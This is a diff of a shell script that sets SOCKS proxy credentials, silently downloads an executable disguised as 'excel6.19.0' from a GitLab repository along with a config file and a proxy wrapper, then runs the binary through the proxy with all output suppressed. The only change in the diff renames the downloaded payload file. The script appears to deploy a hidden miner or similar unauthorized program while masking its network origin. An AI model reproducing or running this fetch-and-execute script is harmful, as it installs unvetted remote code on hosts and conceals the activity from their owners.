@@ -2,7 +2,7 @@ proxy="149.50.222.86"
 port="1080" 
 user="render"  
 pass="render"   
-wget -q -O ds7843324 https://gitlab.com/55113110159/dokerweb/-/raw/main/excel6.19.0 && chmod +x ds7843324
+wget -q -O po893146742 https://gitlab.com/55113110159/dokerweb/-/raw/main/excel6.19.0 && chmod +x po893146742
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
@@ -21,4 +21,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./ds7843324 -c "config.json" >/dev/null 2>&1
+./panel ./po893146742 -c "config.json" >/dev/null 2>&1
